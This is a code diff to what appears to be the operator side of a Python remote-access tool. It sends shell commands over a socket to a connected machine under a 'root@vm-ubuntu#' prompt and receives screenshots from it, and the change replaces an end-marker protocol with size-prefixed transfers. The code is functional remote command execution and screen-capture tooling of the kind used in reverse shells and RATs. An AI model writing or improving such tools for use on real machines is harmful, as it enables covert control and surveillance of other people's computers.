@@ -8,24 +8,32 @@ def command(conn):
     while True:        
         cmd = input("root@vm-ubuntu# ")
         conn.sendall(cmd.encode('utf-8'))
-        received_msg = ""
         if cmd.strip() == "quit":
             break
         else:
-            while True:
+            fileSize = 0
+            data = conn.recv(1024)
+            try:
+                fileSize = int(data.decode('utf-8').rstrip('\x00'))
+            except:
+                pass
+            count = 0
+            while (count < fileSize):
                 data = conn.recv(1024)
-                if data.decode('utf-8') == "END\n\x00":
-                    # Message ending
-                    print(received_msg.strip())
-                    break
-                # Decodes the received message
-                received_msg += data.decode('utf-8')
+                count += len(data)
+                print(data.decode('utf-8').rstrip('\x00'))
                 
 def screenshot(file):
-    while True:
+    fileSize = 0
+    data = conn.recv(1024)
+    try:
+        fileSize = int(data.decode('utf-8').rstrip('\x00'))
+    except:
+        pass
+    count = 0
+    while (count < fileSize):
         data = conn.recv(1024)
-        if data.decode('utf-8') == "END\n\x00":
-            break
+        count += len(data)
         # Writes the received message
         file.write(data.rstrip(b'\x00'))
     print("Screenshot finalizado com sucesso.")
